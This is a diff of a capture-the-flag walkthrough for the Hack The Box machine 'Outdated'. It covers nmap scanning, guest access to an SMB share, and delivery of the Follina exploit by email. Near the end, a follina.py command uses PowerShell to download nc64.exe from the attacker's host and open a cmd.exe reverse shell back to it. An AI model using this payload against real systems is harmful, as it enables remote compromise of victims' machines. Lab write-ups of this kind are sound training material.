@@ -1,6 +1,8 @@
-# IN PROGRESS
+![image](https://user-images.githubusercontent.com/105310322/191048800-3175a9b4-64c0-41f5-acff-f6801d235460.png)
 
-### Tools: smbclient, swaks, follina.py, SharpWSUS
+### Tools: smbclient, swaks, follina, whisker, rubeus, SharpWSUS
+
+Our nmap scan shows alot of ports open but we are going to start with smb.
 
 ```console
 └──╼ [★]$ nmap -A -p- -T4 -Pn 10.129.56.38
@@ -71,7 +73,7 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 710.25 seconds
 ```
-
+Checking out smb we see that we can access the Shares.....share.
 
 ```console
 └──╼ [★]$ smbclient -L //outdated.htb -N
@@ -89,7 +91,9 @@ Nmap done: 1 IP address (1 host up) scanned in 710.25 seconds
 	WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.
 SMB1 disabled -- no workgroup available
 ```
+So we login as a guest and use get to download it to our computer.
 
+Note: Make sure to be in a directory on your host computer that allows for files to be copied over. Ex. Do not be in a root only folder. Otherwise you may get an error when using GET on the file.
 
 ```console
 └──╼ [★]$ smbclient  //outdated.htb/Shares -N
@@ -105,13 +109,36 @@ getting file \NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (687.3 KiloByt
 smb: \> quit
 ```
 
+The files gives us an email and a list of CVE's that the victim may be vulnerable to. Since an email was given and port 25 SMTP was open I figured we could do something with sending an exploit over email. This means we will need to use the Follina exploit.
+
+
 ![image](https://user-images.githubusercontent.com/105310322/190208631-9d1ac727-8836-4db3-b089-28bb0edcc4c5.png)
 
+Setting up this exploit took some time and was the most inconsistent for me, eventually I got it to work.
 
 https://github.com/JohnHammond/msdt-follina
 
-sudo vim /etc/hosts
-outdated.htb mail.outdated.htb
+Be sure to add the following to your hosts file before continuing.
+
+```
+└─$ sudo vim /etc/hosts
+10.129.56.56 outdated.htb mail.outdated.htb
+```
+
+Now for the next part be sure to follow exactly and hopefully this exploit will work for you. 
+
+Note: I used 4 different Follina exploits. 1st problem was getting a callback. I.E. "GET / HTTP/1.1". After finally getting that the 2nd problem was cataching the reverse shell. Still unsure why it did not always work.
+
+2nd Note: There are multiple ways to do this exploit and my method may not work for you. My friend had a different method that didn't work for me even though we did the same thing.
+
+Step 1: Set up your listener
+
+Step 2: Set up your exploit. I used john hammond follina. (I did not edit the python file, instead I copied the command from it and made the exploit run it directly)
+
+IMPORTANT!!! Im 90% sure you have to use port 80 for this exploit to work. I never recieved a call back when I used any other port. Which means no webshells can be used. 
+
+Basically this exploit is going to encode a malicious html file and host it on port 80. After the victim access's the link it will make them download nc64.exe from my host computer and then run it for a reverse shell.
+
 ```
 └─$ sudo python3 follina.py -i 10.10.16.8 -p 80 -c "Invoke-WebRequest http://10.10.16.8/nc64.exe -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe 10.10.16.8 1234"
 [+] copied staging doc /tmp/tuqxmos9
